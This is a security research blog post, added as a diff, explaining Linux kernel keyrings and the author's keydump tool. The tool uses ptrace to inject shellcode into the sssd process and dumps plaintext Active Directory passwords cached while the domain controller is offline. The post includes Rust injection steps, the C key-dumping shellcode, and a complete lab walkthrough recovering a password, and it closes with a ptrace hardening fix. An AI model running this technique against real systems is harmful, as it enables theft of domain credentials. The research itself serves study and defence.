@@ -1,0 +1,800 @@
+#+title: Keyrings dump with keydump: Extracting SSSD cleartext credentials
+#+author: Eloy Pérez González
+#+date: 2024-09-08
+#+tags[]: Linux Keyrings sssd
+#+toc: True
+
+Hi there!!
+
+Time ago I was tinkered with Linux [[https://www.man7.org/linux/man-pages/man7/keyrings.7.html][keyrings]] to extract Kerberos tickets from
+keys with [[https://github.com/zer1t0/tickey][tickey]], and recently I was involved in a new interesting project in
+which I needed to learn again about this topic, so I will try to describe the
+important points here in case my future self or anyone else want to learn them.
+
+First we need to know is that Linux keyrings is a key management facility. The
+keys are entities that can be used by programs to store secrets, like passwords
+or certificates, in a secure way, preventing other programs or users from
+accessing them.
+
+This been said, let's go to the topic!
+
+* The beginning
+:PROPERTIES:
+:custom_id: the-beginning
+:END:
+
+I was experimenting a little with sssd after reading about [[https://github.com/CiscoCXSecurity/linikatz][linikatz]]
+and then I found the following NOTE in the ~krb5_store_password_if_offline~
+option of the [[https://linux.die.net/man/5/sssd-krb5][sssd-krb5]] documentation:
+
+#+begin_src 
+krb5_store_password_if_offline (boolean)
+    Store the password of the user if the provider is offline and use it to request a TGT when
+    the provider comes online again.
+
+    NOTE: this feature is only available on Linux. Passwords stored in this way are kept in
+    plaintext in the kernel keyring and are potentially accessible by the root user (with
+    difficulty).
+
+    Default: false
+#+end_src
+
+There are a few points here I would to discuss:
+
+First, and maybe the more important part is that *passwords are stored in
+plaintext* in a kernel keyring. The documentation also points that this could be
+accessible by root _with difficulty_. But, what is difficulty? In my mind it
+just means that a tool doesn't exists to do the job yet, so that is what I did.
+
+Another important fact is that passwords are only stored **when the provider is
+offline**. In a common Active Directory (AD) scenario, this means that passwords
+are only stored when the Domain Controller (DC) cannot be reached, therefore
+making the attack less exploitable. However in case we are root of a machine, we
+could force the machine to lost connection with the Domain Controller by
+applying a firewall rule, for example, so we can collect the passwords of new
+users that logs in the machine. However, for this purposes, maybe creating a fake PAM
+module could be easier and more relayable approach. All this been said, I did it
+anyway for the fun of a challenge.
+
+And last but not least, the default value of ~krb5_store_password_if_offline~ is
+~false~. Which means that in absense of this option passwords are not
+stored. However, by default [[https://linux.die.net/man/8/sssd][sssd]] sets this option to ~true~, so no problem at
+all.
+
+Therefore, in order to extract the credentials, I required a tool able to
+extract keyrings from other processes keyrings. As I said before, I did this in
+the past by creating [[https://github.com/zer1t0/tickey][tickey]], but that tool was too focused on the kerberos
+tickets. So I thought that I had to create a more generic tool to dump all the
+keys of any process (or thread) keyrings, no matter the purpose.
+
+That is how [[https://github.com/zer1t0/keydump][keydump]][fn:keydump] was born. So in this post I will try to explain the concepts
+behind keydump so we can understand its functionality.
+
+
+However, for those who are impatient, here is a preview of the keydump output
+dumping a password stored by sssd process: 
+
+#+caption: Dumping sssd passwords with keydump
+#+begin_src 
+$ ps -o pid --no-headers -C sssd | sed 's/ //g' | sudo ./keydump -
+[PID 452] Shellcode injected
+[PID 452] /tmp/k_452 exists, so keys must be dumped!!
+$ sudo cat /tmp/k_452/210e3b29_user_Administrator_dev_lab__10
+S3cur3p4ss
+#+end_src
+
+* The problem
+:PROPERTIES:
+:custom_id: the-problem
+:END:
+
+So we want to dump the keys of other processes? The problem is that keys are
+designed to avoid that.
+
+Keys can be created with permissions that will allow the only process (or even
+thread) which creates the key to read it. In the case of sssd, we can see how
+the key is created in the following line of the
+[[https://github.com/SSSD/sssd/blob/077d2993a1b306e7cfe61618cbd5d03c602572f8/src/providers/krb5/krb5_delayed_online_authentication.c#L287][add_user_to_delayed_online_authentication]] function:
+
+#+caption: sssd code to store a password into a key
+#+begin_src c
+    new_pd->key_serial = add_key("user", new_pd->user, password, len,
+                                 KEY_SPEC_SESSION_KEYRING);
+#+end_src
+
+To clarify, sssd is using a key that can only be accessed by processes its
+current session (not a login session, but a [[https://www.informit.com/articles/article.aspx?p=397655&seqNum=6][process session]] created with
+[[https://www.man7.org/linux/man-pages/man2/setsid.2.html][setsid]]). Hence, we could the follow a similar approach to the one I used with
+[[https://github.com/zer1t0/tickey][tickey]], by injecting a new process into that session by attaching us to ssdd
+with [[https://www.man7.org/linux/man-pages/man2/ptrace.2.html][ptrace]] and forcing it to [[https://www.man7.org/linux/man-pages/man2/fork.2.html][fork]] into a new process that will dump the keys
+for us. However, in this occasion my approach will be to try to dump the keys
+from the sssd process itself for several reasons:
+
+- Maybe in the future this is key is modified to only allow access from the same
+  process.
+
+- Extracting from the process itself will allow to reuse the tool to other
+  programs that only allow the same process to read the key.
+
+- And the real reason, I wanted to do it that way, and know if I could do it by
+  injecting a shellcode based in my [[https://github.com/zer1t0/shellnova][shellnova]] project.
+
+So let's see how this can be done.
+
+#+begin_quote
+I would like you to notice that in Linux, threads are implemented as lightweight
+processes, and therefore each thread can have its own set of credentials. That
+is the reason threads can have keys that are only accessed by themselves.
+
+This also means that injecting code in a thread is the same as injecting it
+into a process, we just need to specify the TID (Thread ID) instead of PID in
+the ~ptrace~ syscall. In fact, when we specify the PID, we are just specifying
+the TID of the process main thread.
+#+end_quote
+
+* Keyrings
+:PROPERTIES:
+:custom_id: keyrings
+:END:
+
+First we need to know how to dump keys from a process. As I have mentioned,
+keys are stored in kernel memory. In this section I will try to describe all the
+relevant points for our purpose, but you can find more information on the
+[[https://www.man7.org/linux/man-pages/man7/keyrings.7.html][keyrings manual page]].
+
+#+begin_quote
+Note that Linux keyrings are not the only keyring solution, but there are many
+others like [[https://wiki.gnome.org/Projects/GnomeKeyring/][GNOME Keyring]], that aren't managed by the Linux kernel.
+#+end_quote
+
+In order to read the contents of a key, we need to know its key ID, since it
+is required to perform the ~KEYCTL_READ~ operation of the [[https://www.man7.org/linux/man-pages/man2/keyctl.2.html][keyctl syscall]]. In our
+case, we want to read all the keys a process can access, so how do we get their
+IDs?
+
+** The /proc/keys file
+:PROPERTIES:
+:custom_id: the-proc-keys-file
+:END:
+
+Well, we just need to read the =/proc/keys= file, which is a pseudo-file in the
+[[https://www.man7.org/linux/man-pages/man5/proc.5.html][proc filesystem]] that returns the available keys for the process that reads
+it. Here is an example:
+
+#+caption: Available keys for the cat process
+#+begin_src
+$ cat /proc/keys
+00c58dad I--Q---    58 perm 3f030000  1000  1000 keyring   _ses: 1
+0ae2c7d1 I--Q---     1 perm 3f010000  1000  1000 user      user_secret: 6
+102e811f I--Q---   104 perm 3f030000  1000  1000 keyring   _ses: 2
+244b527f I--Q---     4 perm 1f3f0000  1000 65534 keyring   _uid.1000: empty
+2729088e I--Q---     1 perm 1f3f0000  1000 65534 keyring   _uid_ses.1000: 1
+#+end_src
+
+As we can appreciate, there is a line per key, a very common format in the Unix
+world. In each line we have several fields that describe a key. Let's review
+them to properly understand them.
+
+In the first field we have the *key ID*, or serial number, that uniquely
+identifies the key. This is the main piece of information we want to retrieve to
+read the key contents, but let's also understand the other fields.
+
+The second field indicates *state flags* related to the keys. Here we need to
+check that the key we want to read have the ~I~ flag, which means the key is
+instanciate, that is, that the key has been created. This may sound weird, since
+all the keys should be created to exists right? However keys can also be
+requested and created by a third party, as described in [[https://www.man7.org/linux/man-pages/man2/request_key.2.html][request_key(2)]], and
+being in under construction state, indicated by the ~U~ flag.
+
+The third field, known as *usage*, indicates how many links point to the key. A
+key can be pointed by a keyring, that is an special type of key that keeps links
+that point to other keys, like a folder. If a key, even a keyring, lost all its
+references, it is deleted. Due to this some keyrings, the anchor keyrings,
+require a reference from kernel structures.
+
+The fourth field is the *key timeout*, and ~perm~ (permanent) keyword is
+used to indicate that the key don't expire. An expired key cannot be used and it
+will be deleted.
+
+The fifth field are the *permissions*, with four permission sets, a byte
+per set (two hexadecimal digits), that refers to the possessor process or
+thread, user, group and other permissions. The last 3 are similar to file
+permissions sets, but the possessor set is more complicated and requires further
+explanation, which I will provide below. Moreover, the permissions are different
+than the ones of a file, and will also be explained below.
+
+Then we have the *user and group* ids of the key, that identifies the user and
+group owner of a key (that is not the same as the possessor). A value of 65534
+(-1 in signed integer) in the group field means the key has no group.
+
+The eighth field is the *key type*. There are several types of keys with
+different characteristics, some of them even don't support the read operation so
+its content cannot be retrieved (from userspace at least). Common types of
+keys are the following:
+
++ *user* : A generic key that allows to store secrets completely in kernel
+  memory (payload up to 32767 bytes) and retrieve them from userspace.
+
++ *keyring* : Contains links to other keys (even other keyrings). This is a very
+  special key type since works like a "directory" that allows keys to become
+  searchable by description.
+
++ *logon* : Like user type, but it doesn't allow read the secret payload from
+  user space.
+
++ *big_key* : Like user type, but it allows bigger secrets to be stored (up to
+  1 MiB). Therefore big keys may be stored encrypted in a tmpfs filesystem.
+
++ [[https://docs.kernel.org/crypto/asymmetric-keys.html][*asymmetric*]] : Allows to store public and private key pairs, or just public.
+  It doesn't allow reading the payload from userspace, but it provides
+  operations for encrypt, decrypt, sign and verify signature.
+
+There are many more key types (like [[https://github.com/torvalds/linux/blob/bfa8f18691ed2e978e4dd51190569c434f93e268/certs/blacklist.c#L138][blacklist]], [[https://github.com/torvalds/linux/blob/bfa8f18691ed2e978e4dd51190569c434f93e268/crypto/asymmetric_keys/pkcs7_key_type.c#L70][pkcs7]], [[https://github.com/torvalds/linux/blob/bfa8f18691ed2e978e4dd51190569c434f93e268/fs/crypto/keyring.c#L173][.fscrypt]], etc) that I do
+not list here cause I don't know its purpose, but in case you are curious, you
+can discover them by searching for the use of the "register_key_type" function
+in [[https://github.com/torvalds/linux][Linux kernel source code]].
+
+The final field is composed by two fields, the *name or description* of the key,
+which can be used to search for the key in the keyrings, and some *metadata*
+whose information varies between different types of keys, for example, in the
+case of keyrings the metadata shows the number of links contained in them and
+in the case of user keys, it indicates their size in bytes.
+
+With the information we extract from the ~/proc/keys~ file we are good to go and
+try to dump all the keys. My approach in this case was to just read
+~/proc/keys~ and try to dump all the keys listed, which is quite easier than
+trying to read the permissions and guess which keys can be dumped.
+
+** The keys permissions
+:PROPERTIES:
+:custom_id: the-keys-permissions
+:END:
+
+Notwithstanding, while I think a brute-force approach is a good decision for
+reading keys of a process, if we want to read an specific key, trying to inject
+in all the processes (and threads) of the system until we read it may not be a
+good option, so being able to understand the permissions of a key may
+facilitate us to know what process infect.
+
+As we have say previously, the permissions are formed by four sets, and for each
+set we have the following permissions:
+
++ *view* (0x01): Allows to read the key attributes. The keys for which the
+  process has view permissions are the ones listed in ~/proc/keys~.
+
++ *read* (0x02): Allows to read the payload. However, some key types such as
+  "logon" and "asymmetric" don't support the read operation.
+
++ *write* (0x04): Allows to update the payload and revoke the key.
+
++ *search* (0x08): Allows the key to be found by a search, that is looking
+ for a key through the keyrings by its type and description/name.
+
++ *link* (0x10): Allows to create new links that point to the key.
+
++ *setattr* (0x20): Allows to revoke the key, update the permissions mask
+  and the uid (user id) and gid (group id), setting a key timeout and apply a
+  restrictions to keyrings (implies that keys added to them must be signed).
+
+Moreover, the four permissions sets are possessor, user, group and others. As we
+imagine, the user and group apply to the key user and group owners, and the
+other to any other user. 
+
+Let's see an example of a ~/proc/keys~ line:
+#+caption: 
+#+begin_src
+0ae2c7d1 I--Q---     1 perm 3f010000  1000  1000 user      user_secret: 6
+#+end_src
+
+We can see that permissions for the ~user_secret~ key are ~3f010000~, which
+means that all the permissions are granted to the possessor, just view
+permissions to the user and no permissions for group or others.
+
+Besides, we must keep in mind that, the same as files, the *user, group and
+others permissions are exclusive*, this means that if the user of the process
+trying to access the key match with the user key, the user permissions will be
+applied, and no group or other permissions, even if these (for some curious
+reason) are more permissive than those of the user. Same caso for group
+permissions. And in case there is no match for process user or groups, then the
+other permissions will apply.
+
+On the other hand we have the *possessor permissions*, which are quite important
+cause generally the possessors are granted the highest privileges in a key. But
+possessor permissions are different in several aspects:
+
+- *Are inclusive*: Possessor permissions are applied together with the one of
+  other three permissions sets that applies. This means that if, for example,
+  a process can be applied both user and possessor permissions and the user
+  permissions only allow to read a key, and the possessor permissions only allow
+  to write the key, the process can both read and write.
+
+- *Are dynamic*: Possessor permissions are applied only if a key is possessed by
+  the current process (or thread), and key possession is calculated each time
+  the key is accessed.
+
+So, how can we know if a key is possessed by a process? We need to follow the links
+from the anchor keyrings.
+
+Wonderful, that reveals another question, *what are the anchor keyrings?* If you
+recall, I have said that every key, even keyrings, needs to be referenced at
+least once in order to not be deleted by the kernel. In fact, each time a key is
+created (with [[https://www.man7.org/linux/man-pages/man2/add_key.2.html][add_key]] syscall) a keyring must be specified to contain a link to
+that key (same situation in files, as each one must be created under a
+folder). Now imagine we want to create our first keyring which will hold links
+to all our keys, what keyring will point to our first keyring? The answer is an
+[[https://man.archlinux.org/man/keyrings.7.en#Anchoring_keys][anchor keyring]]. *Anchor keyrings are special keyrings linked by kernel
+structs*. And there are several, that in conjunction with the key possession,
+allows keys to only be accessed from specific scopes.
+
+These are the available anchor keyrings (that are generally created by the
+kernel when they are accessed):
+
+- *Process keyrings*: These keyrings are linked to the process
+  credentials. There are three of them with different scopes:
+  + [[https://www.man7.org/linux/man-pages/man7/thread-keyring.7.html][thread-keyring]]: Only can be accessed by the current thread. It has the name
+    /_tid/.
+  + [[https://www.man7.org/linux/man-pages/man7/process-keyring.7.html][process-keyring]]: Can be accessed by all the threads of the current
+    process. It has the name /_pid/.
+  + [[https://www.man7.org/linux/man-pages/man7/session-keyring.7.html][session-keyring]]: Can be accessed by all the processes in the current login
+    session (since it is created by [[https://linux.die.net/man/8/pam][PAM]]). It has the name /_ses/.
+
+- *User keyrings*: This keyrings are tied to kernel user structures, so they
+  only can be used while the user has an active session.
+  + [[https://man7.org/linux/man-pages/man7/user-keyring.7.html][user-keyring]]: Can be accessed by all the processes of the user. It has the
+    name /_uid.<uid>/ where <uid> is replaced by the user uid.
+  + [[https://man7.org/linux/man-pages/man7/user-session-keyring.7.html][user-session-keyring]]: Can be accessed by all the processes of the user and
+    it is used in case the session keyring is not created. It has the name
+    /_uid_ses.<uid>/ where <uid> is replaced by the user uid.
+
+- [[https://man7.org/linux/man-pages/man7/persistent-keyring.7.html][Persistent keyring]]: Can be accessed by all processes of the user, but it is
+  not destroyec when the user logs out, so it is intended to be accessed by
+  background services that acts on behalf on an user. It has an expiration
+  timeout, so if its not used in a while it is deleted. It has the name
+  /_persistent.<uid>/ where <uid> is replaced by the user uid.
+
+So these are the anchor keyrings we have in a system. They are similar to a root
+directory in a filesystem, specially the process keyrings, that are the ones
+used in possession.
+
+So *what it is possession*? and how is calculated? The answer is that a key is
+possessed when it is granted /search/ permission and can be accessed by
+traversing down the keyrings links starting by the thread-keyring,
+process-keyring, or session-keyring. You can check the algorithm in
+[[https://man.archlinux.org/man/keyrings.7.en#Possession][Possession section of keyrings(7)]].
+
+* About keydump
+:PROPERTIES:
+:custom_id: about-keydump
+:END:
+
+So, now we know what keys are and we are aware that some keys are only
+accessible by a process or thread, we need a way to extract them. I can think of
+two possibilities:
+
+- Executing some code in the context of the process (or thread) with access to a
+  target key.
+- Reading the keys with a Linux module from kernel space.
+
+I choose the first option since it was easier to me cause I'm not familiar with
+Linux modules programming (but it is a nice project for the future).
+
+Therefore, to execute some code in other process we can act as a debugger and
+inject a shellcode into that process. I'm assuming we have root privileges, so
+we can trace any process with the [[https://www.man7.org/linux/man-pages/man2/ptrace.2.html][ptrace]] syscall (unles the system is hardened).
+
+** The injection
+:PROPERTIES:
+:custom_id: the-injection
+:END:
+
+How we can perform a [[https://blog.f0b.org/2022/05/process-injection-on-linux-injecting-into-processes/][code injection with ptrace]][fn:linux-process-injection]?
+Basically, these are the steps I follow in keydump for injection a shellcode
+into a target process:
+
+1. Attach to the target process
+2. Look for a syscall instruction
+3. Execute mmap to allocate memory for the shellcode
+4. Copy the shellcode into remote process memory
+5. Call the shellcode
+
+These steps can be found in the [[https://github.com/zer1t0/keydump/blob/1c0a26a959b4409865a511a5549e1eaad3d3d6d8/src/main.rs#L92][dump_remote_process_keys function of
+keydump]]. And for each one here is the code and the explanation:
+
+*** 1. Attach to the target process
+:PROPERTIES:
+:custom_id: 1-attach-to-the-target-process
+:END:
+
+#+begin_src rust
+tracer::basics::attach_process(pid)?;
+#+end_src
+
+This steps requires to perform a ~PTRACE_ATTACH~ operation in the ptrace syscall
+and waiting for the process to effectively stops.
+
+*** 2. Look for a syscall instruction
+:PROPERTIES:
+:custom_id: 2-look-for-a-syscall-instruction
+:END:
+
+#+begin_src rust
+let syscall_addr = tracer::x64::syscall::search_syscall_inst_nearby(pid)?;
+#+end_src
+
+In next steps we require to call an mmap syscall in order to allocate memory for
+the shellcode. In order to do that we need to redirect the execution of the
+program to a syscall instruction by setting the syscall instruction address in
+the the program counter, which is the ~rip~ register in x64. 
+
+Therefore we need to find a syscall instruction inside the process memory. Since
+usually after tracing a process this is stopped when calling a syscall I'm going
+to check if that is the case and store the syscall instruction address. In other
+case my program failed, but a memory scanning could be implemented for searching
+for a syscall instruction, or we could resume the process execution until a
+syscall is executed (can be done with ~PTRACE_SYSCALL~).
+
+*** 3. Execute mmap to allocate memory for the shellcode
+:PROPERTIES:
+:custom_id: 3-execute-mmap-to-allocate-memory-for-the-shellcode
+:END:
+
+#+begin_src rust
+let mmap_addr = tracer::x64::syscall::exec_mmap_x64(
+        pid,
+        syscall_addr,
+        0,
+        shc.len() as u64,
+        libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
+        libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
+        -1,
+        0,
+    )?;
+#+end_src
+
+In order to perform an [[https://www.man7.org/linux/man-pages/man2/mmap.2.html][mmap syscall]], we need to set the ~rip~ registry pointing to
+the syscall instruction we have found and passing the arguments to
+mmap by setting them in the proper registers which are ~rdi~, ~rsi~, ~rdx~,
+~r10~, ~r8~, ~r9~[fn:linux-syscall-calling-convention]. Notice that we need to
+reserve a memory section which allows us to write and execute (and read) for
+writing and executing the shellcode (besides, in this case our shellcode also
+require these permission for proper execution). 
+
+However, before setting the registers, we need to save the register original
+values to restore then afterwards. Once this is done, we execute the syscall
+instruction by just performing a single-step operation which only executes one
+instruction (the syscall instruction). Then we retrieve the value returned by
+the mmap syscall, stored in ~rax~ registry, and restore the registers to their
+original values to avoid disrupting the target process.
+
+*** 4. Copy the shellcode into remote process memory
+:PROPERTIES:
+:custom_id: 4-copy-the-shellcode-into-remote-process-memory
+:END:
+
+#+begin_src rust
+tracer::x64::basics::write_memory_x64(pid, map_addr, shc)?;
+#+end_src
+
+As result of the mmap syscall, we have reserved a memory region to
+which write our shellcode. We can do this by writing the shellcode bytes into
+the =/proc/<pid>/mem= pseudo-file, where pid is the pid of the target process.
+
+*** 5. Call the shellcode
+:PROPERTIES:
+:custom_id: 5-call-the-shellcode
+:END:
+
+#+begin_src rust
+let rip = tracer::x64::register::rip(pid)?;
+
+tracer::x64::basics::stack_push_x64(pid, rip - rip_offset)?;
+
+tracer::x64::register::set_rip(pid, map_addr + rip_offset)?;
+#+end_src
+
+In order to call the shellcode we simply need to set into the ~rip~ register the
+address to which we just have copied the shellcode. Besides, since we want to
+restore the real execution flow of the process once our shellcode finish its
+job, we insert into the stack as return value the address where the process was
+stopped.
+
+You may notice the =rip_offset= variable, what is this? When the target process
+is interrupted by the ptrace attach, it can be in the middle of a syscall. In
+this case, the ~rip~ register points to the syscall next instruction, but the
+process needs to be resumed in the syscall instruction to repeat it (since it
+wasn't completed) and avoid an unexpected behavior. This is precisely what
+happens when the debugger detaches from the process (PTRACE_DETACH operation),
+that the ~rip~ is subtracted 2 (the syscall instruction size in x64) so no
+problems arise. And to handle this (not so) special situation I have introduced
+the =rip_offset= variable whose value is 2 when the target process is stopped
+while calling a syscall.
+
+Thus, I indicate that the address of the shellcode is the allocated address
+(with mmap) plus the offset that will be subtracted when we will detach from the
+target process. Furthermore the return address could be the instruction pointed
+by ~rip~ when the process was stopped, or in the case of the situation
+previously described, the previous syscall instruction, so 2 must be subtracted
+from ~rip~.
+
+To sum up, we are simulating a =call= instruction to invoke our shellcode (it is
+important to notice that it is responsibility of the shellcode, once done, to
+restore the values of the registers so the target process don't crash). Then,
+when the returned address is pushed to the stack and ~rip~ points to our
+shellcode address, we just detach from the target process. When this happens,
+the target process is resumed, executing our shellcode and finally returning to
+its normal execution flow.
+
+*** Extra step: Checking if the dump was successful
+:PROPERTIES:
+:custom_id: extra-step-checking-if-the-dump-was-successful
+:END:
+
+Once the shellcode is injected into the target process, it will create a folder
+under the =/tmp/= directory which will contain files with the value of the
+target process readable keys. Therefore, after injecting the shellcode, we wait
+for a little period of time and check if such folder was created.
+
+** The shellcode
+:PROPERTIES:
+:custom_id: the-shellcode
+:END:
+
+The another key part of keydump is the shellcode to inject into the
+target process. To create the shellcode I have used [[https://github.com/zer1t0/shellnova][shellnova]][fn:shellnova], a
+project of mine which provides a template for shellcode creation that includes
+the following:
+
+- Creating a shellcode from C code
+- Resolving libc functions on runtime, so we can use them from the shellcode
+- Erasing the implant once the work is done, so no traces are left
+
+The shellcode, as I mentioned in the keyrings section, will list the keys by
+reading the =/proc/keys= file and will try to read the content of each key and
+saved it into a file under =/tmp/k_<tid>/= where =<tid>= is the tid of the
+target thread. Here is the code (from [[https://github.com/zer1t0/keydump/blob/1c0a26a959b4409865a511a5549e1eaad3d3d6d8/implant/src/main.c#L145][dump_keys]] function) that performs such
+actions:
+
+#+caption: 
+#+begin_src c
+    sprintf_d(keys_dir, "/tmp/k_%d", tid);
+    err = mkdir_z(keys_dir, 0755);
+    if (err != 0 && err != -EEXIST) {
+        LOG_PRINTF("Error mkdir: %d\n", err);
+        goto close;
+    }
+
+    dp = opendir_d(keys_dir);
+    if(!dp) {
+        PRINTF("Error opendir");
+        goto close;
+    }
+    dir_fd = dirfd_d(dp);
+
+    fp = fopen_d("/proc/keys", "r");
+    if(!fp) {
+        PRINTF("Error opening /proc/keys");
+        goto close;
+    }
+
+    while ((nread = getline_d(&line, &len, fp)) != -1) {
+        sscanf_d(line, "%lx %s %d %s %x %d %d %s", &k_id, k_flags, &k_state, k_expiration, &k_perms, &k_uid, &k_gid, k_type);
+        if(read_key(k_id, &key_data, &key_data_size) == 0){
+            desc = extract_description(line);
+            if(!desc) {
+                desc = "";
+            }
+            // printf("%s\n", desc);
+            normalize_description(desc);
+            // printf("Key len of %lu\n", key_data_size);
+            sprintf_d(k_filename, "%lx_%s_%s", k_id, k_type, desc);
+            write_to_file(dir_fd, k_filename, key_data, key_data_size);
+            free_d(key_data);
+        }
+    }
+#+end_src
+
+* Attacking SSSD
+:PROPERTIES:
+:custom_id: attacking-sssd
+:END:
+
+Now that we understand the underlying mechanism, it is time for performing the
+actual attack, for which is required to have a domain joined GNU/Linux machine
+through sssd. I'm not going to describe the process here since many tutorials
+exists on the internet:
+
+- [[https://hackliza.gal/en/posts/linux-en-ad/][How to join Debian to Active Directory]]
+- [[https://www.pierreblazquez.com/2024/02/04/how-to-join-debian-12-to-an-active-directory-domain/][How-To: join Debian 12 to an Active Directory domain]]
+- [[https://www.redhat.com/sysadmin/linux-active-directory][How to join a Linux system to an Active Directory domain]]
+
+After setting up the lab you must be able to log with ssh into the target
+machine with domain credentials. Like this:
+
+#+begin_src 
+$ ssh Administrator@dev.lab@lab-debian
+Administrator@dev.lab@192.168.122.241's password: 
+Linux debian 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jul 12 22:39:50 2024 from 192.168.122.254
+administrator@dev.lab@debian:~$ 
+#+end_src
+
+I have used the ~Administrator~ account of my domain ~dev.lab~ but you can use
+any account of the domain.
+
+Once you have verified that it is possible to access by ssh to the machine with
+a domain account, you need to verify that the ~krb5_store_password_if_offline~
+option is set to ~true~ in your sssd configuration (in domain settings), which is the
+default value:
+
+#+begin_src
+$ sudo cat /etc/sssd/sssd.conf
+
+[sssd]
+domains = dev.lab
+config_file_version = 2
+services = nss, pam
+
+[domain/dev.lab]
+default_shell = /bin/bash
+krb5_store_password_if_offline = True
+cache_credentials = True
+krb5_realm = DEV.LAB
+realmd_tags = manages-system joined-with-adcli 
+id_provider = ad
+fallback_homedir = /home/%u@%d
+ad_domain = dev.lab
+use_fully_qualified_names = True
+ldap_id_mapping = True
+access_provider = ad
+#+end_src
+
+In case ~krb5_store_password_if_offline~ is not present or setting to ~false~,
+modify the file and set it to ~true~. Then restart the sssd daemon.
+
+Once this is done, disconnect the GNU/Linux machine from the Domain
+Controller. For this you can just turn off the Domain Controller.
+
+Now you will need to access to the machine with two accounts simultaneously: 
+
+- A domain account that will be the victim 
+- A privileged account like root, one with sudo or any user with the
+  ~CAP_SYS_PTRACE~ capability, that will be the attacker. This account can be
+  local or from the domain.
+
+#+begin_quote
+Be aware that the domains account you will use are required to login at least
+once before the Domain Controller is disconnected in order their credentials
+(hashes) to be cached into the GNU/Linux machine.
+#+end_quote
+
+
+You may access first with the domain/victim account using ssh:
+#+begin_src 
+$ ssh Administrator@dev.lab@lab-debian
+Administrator@dev.lab@192.168.122.241's password: 
+Linux debian 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jul 12 22:39:50 2024 from 192.168.122.254
+administrator@dev.lab@debian:~$ 
+#+end_src
+
+You won't need to use this account anymore, just keep its terminal connected in
+the background.
+
+Now, copy the keydump binary to the target machine (by using scp for
+example). You will be required to compile it in a machine with similar
+characteristics (or in the target machine directly) to avoid glibc version
+problems.
+
+Then, in another terminal, access by using the privileged account, the attacker:
+#+begin_src 
+$ ssh lab-debian 
+user@192.168.122.241's password: 
+Linux debian 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Mon Jul 29 16:46:29 2024 from 192.168.122.254
+user@debian:~$ 
+#+end_src
+
+Then, as attackers, we can confirm there is another user logged with the ~who~
+command:
+#+begin_src 
+user@debian:~$ who
+user     pts/0        Jul 28 17:04 (192.168.122.254)
+administrator@dev.lab pts/1        Jul 28 16:46 (192.168.122.254)
+#+end_src
+
+And verify that a key that contains the victim password was created:
+#+begin_src 
+user@debian:~$ sudo cat /proc/keys | grep dev.lab
+10bfb037 I--Q---     1 perm 3f010000     0     0 user      Administrator@dev.lab: 10
+#+end_src
+
+As we can see, a key was created with the name of the victim account to store
+its password, but we don't have permissions for reading, only the possessor
+processes can. We can verify this with the ~keyctl~ command (which must be installed):
+
+#+begin_src 
+user@debian:~$ sudo keyctl read 0x10bfb037
+keyctl_read_alloc: Permission denied
+#+end_src
+
+Fortunately, we can use keydump to dump keys of the sssd process by passing it
+its pid with the following command:
+#+begin_src 
+user@debian:~$ ps -o pid --no-headers -C sssd | sed 's/ //g' | sudo ./keydump -
+[PID 452] Shellcode injected
+[PID 452] /tmp/k_452 exists, so keys must be dumped!!
+user@debian:~$ sudo cat /tmp/k_452/10bfb037_user_Administrator_dev_lab__10
+S3cur3p4ss
+#+end_src
+
+And success!! We were able to dump the sssd keys and retrieve the victim
+password.
+
+* Prevention
+:PROPERTIES:
+:custom_id: prevention
+:END:
+
+Preventing this attack requires no allowing processes to attach to others, which
+can be done with the following command:
+
+#+begin_src 
+echo 3 | sudo tee /proc/sys/kernel/yama/ptrace_scope
+#+end_src
+
+This configures the [[https://www.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html][Yama]] security module to block ptrace (which also prevents
+reading files like =/proc/<pid>/mem= and =/proc/<pid>/maps=). I think it should
+be also possible preventing this attack by using SELinux or Apparmor, but I
+don't know how to do it.
+
+* Conclusion
+:PROPERTIES:
+:custom_id: conclusion
+:END:
+
+In this article I have shown how SSSD stores passwords when the Domain
+Controller is not available, how keyrings works and how we can dump keys of
+other processes with keydump. I hope you enjoy reading it and find it useful.
+
+Happy hacking and Free Palestine!!
+  
+* References
+:PROPERTIES:
+:custom_id: references
+:END:
+
+[fn:keydump] Eloy Pérez González. "keydump". Github. 14 July, 2024,
+https://github.com/zer1t0/keydump
+
+[fn:linux-process-injection] Fob. "Process Injection on Linux - Injecting into Processes". fob's
+notebook, 31 May, 2022, https://blog.f0b.org/2022/05/process-injection-on-linux-injecting-into-processes/
+
+[fn:linux-syscall-calling-convention] claws. "What are the calling conventions
+for UNIX & Linux system calls (and user-space functions) on i386 and
+x86-64". Stack Overflow. 18 January, 2024, https://stackoverflow.com/a/2538212 
+
+[fn:shellnova] Eloy Pérez González. "shellnova". Github. 14 July, 2024,
+https://github.com/zer1t0/shellnova 
+
